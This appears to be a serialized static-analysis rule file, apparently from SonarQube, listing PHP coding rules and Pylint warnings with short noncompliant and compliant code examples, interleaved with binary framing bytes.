<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
class MyClass {
  $my_field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  $myField;
}
</pre>Z
CODE_SMELL
„
php:S117÷
phpS117RLocal variable and function parameter names should comply with a naming convention"MINOR*php:‹<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public function doSomething($my_param){
  $LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function doSomething($myParam){
  $local;
  ...
}
</pre>Z
CODE_SMELL
É
	php:S1990ı
phpS1990&"final" should not be used redundantly"MINOR*php:¶<p>There is no need to use the <code>final</code> modifier inside a <code>final</code> class. Everything in it is <code>final</code> by default.</p>
<h2>Noncompliant Code Example</h2>
<pre>
final class MyClass {

  public final String getName() {  // Noncompliant
    return name;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
final class MyClass {

  public String getName() {  // Compliant
    return name;
  }
}
</pre>Z
CODE_SMELL
ü
	php:S2046ë
phpS2046&Perl-style comments should not be used"MINOR*php:¬<p>Shared coding conventions allow teams to collaborate effectively. This rule flags all Perl-style comments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$myvar; # Noncompliant; this comment should have started with "//"
</pre>
<h2>Compliant Solution</h2>
<pre>
$myvar; // Compliant; this comment started with "//"
</pre>Z
CODE_SMELL
å
	php:S2043˛
phpS2043,Superglobals should not be accessed directly"MINOR*php:©<p>Superglobal variables are predefined variables available in all scopes throughout a script. However, accessing them directly is considered bad
practice. Instead, they should be accessed through an object or framework that handles sanitation and validation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$name = $_POST['name'];
</pre>
<h2>Compliant Solution</h2>
<pre>
$name = $this-&gt;params()-&gt;fromPost('name');
</pre>Z
CODE_SMELL
™
	php:S1075ú
phpS1075URIs should not be hardcoded"MINOR*php:◊<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>Z
CODE_SMELL
Ó
	php:S1757‡
phpS1757%"<?php" and "<?=" tags should be used"MINOR*php:í<p>Coding conventions allow teams to collaborate effectively. For maximum standardization and readability, PHP code should use the long <code>&lt;?php
?&gt;</code> tags or the short-echo <code>&lt;?= ?&gt;</code> tags; it should not use the other tag variations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?
$foo = 1;
?&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php
$foo = 1;
?&gt;
</pre>Z
CODE_SMELL
≤
	php:S2964§
phpS2964"sleep" should not be called"MINOR*php:‹<p><code>sleep</code> is sometimes used in a mistaken attempt to prevent Denial of Service (DoS) attacks by throttling response rate. But because it
ties up a thread, each request takes longer to serve that it otherwise would, making the application <em>more</em> vulnerable to DoS attacks, rather
than less.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (is_bad_ip($requester)) {
  sleep(5);  // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
ß
	php:S1116ô
phpS1116"Empty statements should be removed"MINOR*php:Œ<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  ;                                              // Noncompliant - was used as a kind of TODO marker
}

function doSomethingElse($p) {
  echo $p;;                                      // Noncompliant - double ;
}

for ($i = 1; $i &lt;= 10; doSomething($i), $i++);   // Noncompliant - Rarely, they are used on purpose as the body of a loop. It is a bad practice to have side-effects outside of the loop body
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething() {}

function doSomethingElse($p) {
  echo $p;

  for ($i = 1; $i &lt;= 10; $i++) {
    doSomething($i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL
†
	php:S1126í
phpS1126TReturn of boolean expressions should not be wrapped into an "if-then-else" statement"MINOR*php:ï<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>Z
CODE_SMELL
¯
	php:S1488Í
phpS1488NLocal variables should not be declared and then immediately returned or thrown"MINOR*php:Û<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function computeDurationInMilliseconds() {
  $duration = ((($hours * 60) + $minutes) * 60 + $seconds ) * 1000 ;
  return $duration;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function computeDurationInMilliseconds() {
  return ((($hours * 60) + $minutes) * 60 + $seconds ) * 1000;
}
</pre>Z
CODE_SMELL
¨
	php:S1124û
phpS11241Modifiers should be declared in the correct order"MINOR*php:ƒ<p>The PSR2 standard recommends listing modifiers in the following order to improve the readability of PHP source code:</p>
<ol>
  <li> final or abstract </li>
  <li> public or protected or private </li>
  <li> static </li>
</ol>
<h2>Noncompliant Code Example</h2>
<pre>
static protected $foo;
...
public static final function bar(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected static $foo;
...
final public static function bar(){...}
</pre>Z
CODE_SMELL
ü
	php:S1125ë
phpS1125(Boolean literals should not be redundant"MINOR*php:¿<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($booleanVariable == true) { /* ... */ }
if ($booleanVariable != true) { /* ... */ }
if ($booleanVariable || false) { /* ... */ }
doSomething(!false);

$booleanVariable = condition ? true : exp;
$booleanVariable = condition ? false : exp;
$booleanVariable = condition ?  exp : true;
$booleanVariable = condition ?  exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($booleanVariable) { /* ... */ }
if (!$booleanVariable) { /* ... */ }
if ($booleanVariable) { /* ... */ }
doSomething(true);

$booleanVariable = condition || exp;
$booleanVariable = !condition &amp;&amp; exp;
$booleanVariable = !condition ||  exp;
$booleanVariable = condition &amp;&amp; exp;
</pre>
<h2>Exceptions</h2>
<p>The use of literal booleans in comparisons which use identity operators (<code>===</code> and <code>!==</code>) are ignored.</p>Z
CODE_SMELL
◊
php:S101 
phpS1012Class names should comply with a naming convention"MINOR*php:<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>Z
CODE_SMELL
◊
php:S100 
phpS100@Method and function names should comply with a naming convention"MINOR*php:‚<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression: <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
function DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(){...}
</pre>
<h2>Exceptions</h2>
<p>Methods with an <code>@inheritdoc</code> annotation, as well as magic methods (<code>__construct()</code>, <code>__destruct()</code>,
<code>__call()</code>, <code>__callStatic()</code>, <code>__get()</code>, <code>__set()</code>, <code>__isset()</code>, <code>__unset()</code>,
<code>__sleep()</code>, <code>__wakeup()</code>, <code>__toString()</code>, <code>__invoke()</code>, <code>__set_state()</code>,
<code>__clone()</code>, <code>__debugInfo()</code>) are ignored.</p>
<pre>
function __construct(){...}
function __destruct(){...}

/**
 * {@inheritdoc}
 */
function myFunc(){...}
</pre>Z
CODE_SMELL
§
	php:S1766ñ
phpS1766;More than one property should not be declared per statement"MINOR*php:≤<p>For better readability, do not put multiple property declarations in the same statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php
class Foo
{
   private $bar = 1, $bar2 = 2;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php
class Foo
{
   private $bar1 = 1;
   private $bar2 = 2;
}
</pre>Z
CODE_SMELL
ç
	php:S2737ˇ
phpS2737+"catch" clauses should do more than rethrow"MINOR*php:´<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$s = "";
try {
  $s = readMyFile($fileName);
} catch (Exception $e)  {
  throw $e;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$s = "";
try {
  $s = readMyFile($fileName);
} catch (Exception $e) {
  error_log($e-&gt;getMessage());
  throw $e;  // Compliant
}
</pre>
<p>or</p>
<pre>
$s = "";
try {
  $s = readMyFile($fileName);
} catch (Exception $e) {
  error_log($e-&gt;getMessage());
  throw new MyException("an exception occurred", 2, $e);  // Compliant
}
</pre>
<p>or</p>
<pre>
$s = readMyFile($fileName);
</pre>Z
CODE_SMELL
ö
	php:S1481å
phpS1481(Unused local variables should be removed"MINOR*php:ª<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function numberOfMinutes($hours) {
  $seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function numberOfMinutes($hours) {
  return hours * 60;
}
</pre>Z
CODE_SMELL
º
	php:S1765Æ
phpS1765$The "var" keyword should not be used"MINOR*php:·<p>The PHP 4 method of declaring a variable, using the <code>var</code> keyword, was deprecated in early versions of PHP 5. Even though it's not
considered deprecated in the most recent versions, it's nonetheless not best practice to use it. When <code>var</code> does appear, it is interpreted
as a synonym for <code>public</code> and treated as such. Therefore <code>public</code> should be used instead.</p>
<p>From the PHP Manual:</p>
<blockquote>
  <p>The PHP 4 method of declaring a variable with the var keyword is still supported for compatibility reasons (as a synonym for the public keyword).
  In PHP 5 before 5.1.3, its usage would generate an E_STRICT warning.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php
class Foo
{
    var $bar = 1;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php
class Foo
{
    public $bar = 1;
}
</pre>Z
CODE_SMELL
 
	php:S2050º
phpS2050"Alias functions should not be used"MINOR*php:Ò<p>Certain functions exist in PHP only as aliases of other functions. These aliases have been made available for backward compatibility, but should
really be removed from code. </p>
<p>This rule looks for uses of the following aliases:</p>
<table>
  <tbody>
    <tr>
      <th>Alias</th>
      <th>Replacement</th>
    </tr>
    <tr>
      <td><code>chop</code></td>
      <td><code>rtrim</code></td>
    </tr>
    <tr>
      <td><code>close</code></td>
      <td><code>closedir</code></td>
    </tr>
    <tr>
      <td><code>doubleval</code></td>
      <td><code>floatval</code></td>
    </tr>
    <tr>
      <td><code>fputs</code></td>
      <td><code>fwrite</code></td>
    </tr>
    <tr>
      <td><code>ini_alter</code></td>
      <td><code>ini_set</code></td>
    </tr>
    <tr>
      <td><code>is_double</code></td>
      <td><code>is_float</code></td>
    </tr>
    <tr>
      <td><code>is_integer</code></td>
      <td><code>is_int</code></td>
    </tr>
    <tr>
      <td><code>is_long</code></td>
      <td><code>is_int</code></td>
    </tr>
    <tr>
      <td><code>is_real</code></td>
      <td><code>is_float</code></td>
    </tr>
    <tr>
      <td><code>is_writeable</code></td>
      <td><code>is_writable</code></td>
    </tr>
    <tr>
      <td><code>join</code></td>
      <td><code>implode</code></td>
    </tr>
    <tr>
      <td><code>key_exists</code></td>
      <td><code>array_key_exists</code></td>
    </tr>
    <tr>
      <td><code>magic_quotes_runtime</code></td>
      <td><code>set_magic_quotes_runtime</code></td>
    </tr>
    <tr>
      <td><code>pos</code></td>
      <td><code>current</code></td>
    </tr>
    <tr>
      <td><code>show_source</code></td>
      <td><code>highlight_file</code></td>
    </tr>
    <tr>
      <td><code>sizeof</code></td>
      <td><code>count</code></td>
    </tr>
    <tr>
      <td><code>strchr</code></td>
      <td><code>strstr</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
$arr=array("apple", "pear","banana");
echo sizeof($arr);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$arr=array("apple", "pear","banana");
echo count($arr);
</pre>Z
CODE_SMELL
Ö
	php:S1578˜
phpS15781File names should comply with a naming convention"MINOR*php:ù<p>Shared coding conventions allow teams to collaborate effectively. For that reason, file names should conform to a defined standard. This rule
raises an issue when the names of analyzed files don't match the provided regular expression.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/lQAl">CERT, MSC09-C.</a> - Character encoding: Use subset of ASCII for safety </li>
</ul>Z
CODE_SMELL
Ì
	php:S2038ﬂ
phpS2038&Colors should be defined in upper case"MINOR*php:ê<p>Shared coding conventions allow teams to collaborate effectively. Writing colors in upper case makes them stand out at such, thereby making the
code easier to read.</p>
<p>This rule checks that hexadecimal color definitions are written in upper case.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$white = '#ffffff';  // Noncompliant
$dkgray = '#006400';
$aqua = '#00ffff';  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$white = '#FFFFFF';  // Compliant
$dkgray = '#006400';
$aqua = '#00FFFF';  // Compliant
</pre>Z
CODE_SMELL
≤
	php:S2037§
phpS20373Static members should be referenced with "static::""MINOR*php:œ<p>References in a class to static class members (fields or methods) can be made using either <code>self::$var</code> or <code>static::$var</code>
(introduced in 5.3). The difference between the two is one of scope. Confusingly, in subclasses, the use of <code>self::</code> references the
original definition of the member, i.e. the superclass version, rather than any override at the subclass level. <code>static::</code>, on the other
hand, references the class that was called at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php

class Toy {

    public static function status() {
        self::getStatus();  // Noncompliant; will always print "Sticks are fun!" even when called from a subclass which overrides this method;
    }

    protected static function getStatus() {
        echo "Sticks are fun!";
    }
}

class Ball extends Toy {

    protected static function getStatus() {  // Doesn't actually get called
        echo "Balls are fun!";
    }
}

$myBall = new Ball();
$myBall::status();  // Prints "Sticks are fun!"
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php

class Toy {

    public static function status() {
        static::getStatus();  // Compliant
    }

    protected static function getStatus() {
        echo "Sticks are fun!";
    }
}

class Ball extends Toy {

    protected static function getStatus() {
        echo "Balls are fun!";
    }
}

$myBall = new Ball();
$myBall::status();  // Prints "Balls are fun!"
</pre>
<h2>Exceptions</h2>
<p>No issue is raised when <code>self</code> is used on a constant field, a private field or a private method.</p>
<pre>
class A
{
    private static $somevar = "hello";
    const CONSTANT = 42;

    private static function foo()
    {
        $var = self::$somevar . self::CONSTANT;  // Should be OK
        self::foo();                               // Should be OK
    }
}
</pre>ZBUG
Í
	php:S1109‹
phpS1109@A close curly brace should be located at the beginning of a line"MINOR*php:Û<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition) {
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>Z
CODE_SMELL
˙
	php:S1185Ï
phpS1185UOverriding methods should do more than simply call the same method in the super class"MINOR*php:Ó<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time
this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such
overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Child extends Parent {

  public function func($n,$m) {
    parent::func($n$m);  // Noncompliant
  }
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Child extends Parent {

  public function func($n,$m) {
    parent::func($n$m);
    // do additional things...
  }
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>
<p>or</p>
<pre>
class Child extends Parent {
  // function eliminated
}

class Parent {
  public function func($n, $m) {
    // do something
  }
}
</pre>Z
CODE_SMELL
ﬁ
	php:S1105–
phpS1105:An open curly brace should be located at the end of a line"MINOR*php:Ì<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a
line of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>Z
CODE_SMELL

	php:S1106‚
phpS1106@An open curly brace should be located at the beginning of a line"MINOR*php:˘<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning
of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function myMethod() {  // Noncompliant
  if(something) {  // Noncompliant
    executeTask();
  } else {  //Noncompliant
    doSomethingElse();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function myMethod()
{
  if(something)
  {
    executeTask();
  } else
  {
    doSomethingElse();
  }
}
</pre>Z
CODE_SMELL
ü
	php:S2005ë
phpS2005*String literals should not be concatenated"MINOR*php:æ<p>There is no reason to concatenate literal strings. Doing so is an exercise in reducing code readability. Instead, the strings should be
combined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$msg = "Hello " . "${name}" . "!";  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$msg = "Hello ${name}!";
</pre>Z
CODE_SMELL
∂
	php:S2003®
phpS2003S"require_once" and "include_once" should be used instead of "require" and "include""MINOR*php:≥<p>At root, <code>require</code>, <code>require_once</code>, <code>include</code>, and <code>include_once</code> all perform the same task of
including one file in another. However, the way they perform that task differs, and they should not be used interchangeably.</p>
<p><code>require</code> includes a file but generates a fatal error if an error occurs in the process.</p>
<p><code>include</code> also includes a file, but generates only a warning if an error occurs.</p>
<p>Predictably, the difference between <code>require</code> and <code>require_once</code> is the same as the difference between <code>include</code>
and <code>include_once</code> - the "_once" versions ensure that the specified file is only included once. </p>
<p>Because including the same file multiple times could have unpredictable results, the "once" versions are preferred.</p>
<p>Because <code>include_once</code> generates only warnings, it should be used only when the file is being included conditionally, i.e. when all
possible error conditions have been checked beforehand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
include 'code.php';  //Noncompliant; not a "_once" usage and not conditional
include $user.'_history.php'; // Noncompliant
require 'more_code.php';  // Noncompliant; not a "_once" usage
</pre>
<h2>Compliant Solution</h2>
<pre>
require_once 'code.php';
if (is_member($user)) {
  include_once $user.'_history.php';
}
require_once 'more_code.php';
</pre>ZBUG
ö
	php:S1793å
phpS1793>"elseif" keyword should be used in place of "else if" keywords"MINOR*php:•<p>According to the PSR2 coding standard:</p>
<blockquote>
  <p>The keyword <code>elseif</code> SHOULD be used instead of <code>else if</code> so that all control keywords look like single words.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
if ($expr1) {
  ...
} else if ($expr2) {
  ...
} else {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($expr1) {
  ...
} elseif ($expr2) {
  ...
} else {...}
</pre>Z
CODE_SMELL
‚
	php:S2002‘
phpS2002Errors should not be silenced"MINOR*php:ï<p>Just as pain is your body's way of telling you something is wrong, errors are PHP's way of telling you there's something you need to fix. Neither
pain, nor PHP errors should be ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@doSomethingDangerous($password);  // Noncompliant; '@' silences errors from function call
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomethingDangerous($password);
</pre>ZBUG
’
	php:S2000«
phpS20002Files should not contain characters before "<?php""MINOR*php:Û<p>Having characters before <code>&lt;?php</code> can cause "Cannot modify header information" errors and similar problems with Ajax requests.</p>
<h2>Noncompliant Code Example</h2>
<pre>
test&lt;?php  //Noncompliant
// ...
</pre>
<p>and</p>
<pre>
// Noncompliant; newline before opening tag
&lt;?php
// ...
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php
// ...
</pre>ZBUG
ö
	php:S2010å
phpS2010"&&" and "||" should be used"MINOR*php:«<p>PHP has two sets of logical operators: <code>&amp;&amp;</code> / <code>||</code>, and <code>and</code> / <code>or</code>. The difference between
the sets is precedence. Because <code>and</code> / <code>or</code> have a lower precedence than almost any other operator, using them instead of
<code>&amp;&amp;</code> / <code>||</code> may not have the result you expect.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$have_time = true;
$have_money = false;
$take_vacation = $have_time and $have_money;  // Noncompliant. $take_vacation == true.
</pre>
<h2>Compliant Solution</h2>
<pre>
$have_time = true;
$have_money = false;
$take_vacation = $have_time &amp;&amp; $have_money;  // $take_vacation == false.
</pre>Z
CODE_SMELL
ﬂ
	php:S3626—
phpS3626'Jump statements should not be redundant"MINOR*php:Å<p>Jump statements, such as <code>return</code>, <code>goto</code>, and <code>continue</code> let you change the default flow of program execution,
but jump statements that direct the control flow to the original direction are just a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo($p) {
  $i = $p;
  while ($i &gt; 0) {
    $i--;
    continue; // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo($p) {
  $i = $p;
  while ($i &gt; 0) {
    $i--;
  }
}
</pre>Z
CODE_SMELL
û
php:S139ë
phpS139:Comments should not be located at the end of lines of code"MINOR*php:Ø<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$a = $b + $c; // This is a trailing comment that can be very very long
</pre>
<h2>Compliant Solution</h2>
<pre>
// This very long comment is better placed before the line of code
$a = $b + $c;
</pre>Z
CODE_SMELL
∏
Pylint:W0143ß
PylintW0143;Comparing against a callable, did you omit the parenthesis?"MINOR*py2W0143:∫This message is emitted when pylint detects that a comparison with a callable was made, which might suggest that some parenthesis were omitted, resulting in potential unwanted behaviour.Z
CODE_SMELL
Ç
Pylint:W0701r
PylintW0701Raising a string exception"MINOR*py2W0701:'Used when a string exception is raised.Z
CODE_SMELL
…
Pylint:W1113∏
PylintW1113:Keyword argument before variable positional arguments list"MINOR*py2W1113:ÃWhen defining a keyword argument before variable positional arguments, one can end up in having multiple values passed for the aforementioned parameter in case the method is called with keyword arguments.Z
CODE_SMELL
æ
Pylint:W0141≠
PylintW0141"Used black listed builtin function"MINOR*py2W0141:ŸUsed when a black listed builtin function is used (see the bad-function option). Usual black listed functions are the ones like map, or filter, where Python offers now some cleaner alternative like list comprehension.Z
CODE_SMELL
Ô
Pylint:W0142ﬁ
PylintW0142Used * or ** magic"MINOR*py2W0142:öUsed when a function or method is called using `*args` or `**kwargs` to dispatch arguments. This doesn't improve readability and should be used with care.Z
CODE_SMELL
⁄
Pylint:W1111…
PylintW11112Assigning to function call which only returns None"MINOR*py2W1111:fUsed when an assignment is done on a function call but the inferred function returns nothing but None.Z
CODE_SMELL
Û
Pylint:E0703‚
PylintE0703FException context set to something which is not an exception, nor None"MINOR*py2E0703:kUsed when using the syntax "raise ... from ...", where the exception context is not an exception, nor None.Z
CODE_SMELL
Û
Pylint:W0712‚
PylintW0712=Implicit unpacking of exceptions is not supported in Python 3"MINOR*py2W0712:ÛPython3 will not allow implicit unpacking of exceptions in except clauses.
        See http://www.python.org/dev/peps/pep-3110/ This message
        can't be emitted when using Python >= 3.0.
        <p>This rule was added in Pylint 1.0.0.</p>Z
CODE_SMELL
Æ
Pylint:R0916ù
PylintR0916,Too many boolean expressions in if statement"MINOR*py2R0916:@Used when an if statement contains too many boolean expressions.Z
CODE_SMELL
ò
Pylint:W0710á
PylintW07109Exception doesn't inherit from standard "Exception" class"MINOR*py2W0710:úUsed when a custom exception class is raised but doesn't inherit from the builtin "Exception" class. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
ı
Pylint:W0711‰
PylintW07116Exception to catch is the result of a binary operation"MINOR*py2W0711:}Used when the exception to catch is of the form "except A or B:". If intending to catch multiple, rewrite as "except (A, B):"Z
CODE_SMELL
∂
Pylint:W0150•
PylintW01500Statement in finally block may swallow exception"MINOR*py2W0150:√Used when a break or a return statement is found inside the finally clause of a try...finally block: the exceptions raised in the try clause will be silently swallowed instead of being re-raised.Z
CODE_SMELL
¶
Pylint:W1001ï
PylintW1001'Use of "property" on an old style class"MINOR*py2W1001:ºUsed when Pylint detect the use of the builtin "property" on an old style class while this is relying on new style classes features. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
ﬂ
Pylint:E0712Œ
PylintE0712:Catching an exception which doesn't inherit from Exception"MINOR*py2E0712:cUsed when a class which doesn't inherit from Exception is used as an exception in an except clause.Z
CODE_SMELL
Ñ
Pylint:R0124t
PylintR0124Redundant comparison"MINOR*py2R0124:/Used when something is compared against itself.Z
CODE_SMELL
Ø
Pylint:C0303û
PylintC0303Trailing whitespace"MINOR*py2C0303:ŸUsed when there is whitespace between the end of a line and the newline.
      <p>Added in Pylint 1.0.0.</p>
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1131'>S1131</a> instead.</p>Z
CODE_SMELL
Ä
Pylint:R0123Ô
PylintR0123Comparison to literal"MINOR*py2R0123:®Used when comparing an object to a literal, which is usually what you do not want to do, since you can compare to a different literal than what was expected altogether.Z
CODE_SMELL
Ü
Pylint:C0302ı
PylintC0302Too many lines in module"MINOR*py2C0302:´Used when a module has too many lines, reducing its readability.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS104'>S104</a> instead.</p>Z
CODE_SMELL
†
Pylint:C0304è
PylintC0304Final newline missing"MINOR*py2C0304:»Used when the last line in a file is missing a newline.
               <p>While Python interpreters typically do not require line
               end character(s) on the last line, other programs processing Python
               source files may do, and it is simply good practice to have it.</p>
               <p>Added in Pylint 1.0.0.</p>
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS113'>S113</a> instead.</p>Z
CODE_SMELL
Ö
Pylint:C0305u
PylintC0305Trailing newlines"MINOR*py2C0305:3Used when there are trailing blank lines in a file.Z
CODE_SMELL
Ã
Pylint:E1004ª
PylintE1004Missing argument to super()"MINOR*py2E1004:oUsed when the super builtin didn't receive an argument. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
î
Pylint:R0923É
PylintR0923Interface not implemented"MINOR*py2R0923:9Used when an interface class is not implemented anywhere.Z
CODE_SMELL
Ø
Pylint:W0706û
PylintW0706%The except handler raises immediately"MINOR*py2W0706:«Used when an except handler uses raise as its first or only operator. This is useless because it raises back the exception immediately. Remove the raise operator or the entire try-except-raise block!Z
CODE_SMELL
â
Pylint:W0703¯
PylintW0703Catching too general exception"MINOR*py2W0703:®Used when an except catches a too general exception, possibly burying unrelated errors.
               <p>Catching exceptions should be as precise as possible. The type of
               exceptions that can be raised should be known in advance. Using a
               catch-all Exception instance defeats the purpose of knowing the type
               of error that occur-ed, and prohibits the use of tailored responses.</p>Z
CODE_SMELL
≠
Pylint:W0704ú
PylintW0704Except doesn't do anything"MINOR*py2W0704:QUsed when an except clause does nothing but "pass" and there is no "else" clause.Z
CODE_SMELL
º
Pylint:W0705´
PylintW0705)Catching previously caught exception type"MINOR*py2W0705:QUsed when an except catches a type that was already caught by a previous handler.Z
CODE_SMELL
Ñ
Pylint:C0301Û
PylintC0301Line too long"MINOR*py2C0301:¥Used when a line is longer than a given number of characters.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3ALineLength'>LineLength</a> instead.</p>Z
CODE_SMELL
Û
Pylint:R0801‚
PylintR0801Similar lines"MINOR*py2R0801:£Indicates that a set of similar lines has been detected among multiple file. This usually means that the code should be refactored to avoid this duplication.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=common-py%3ADuplicatedBlocks'>DuplicatedBlocks</a> instead.</p>Z
CODE_SMELL
•
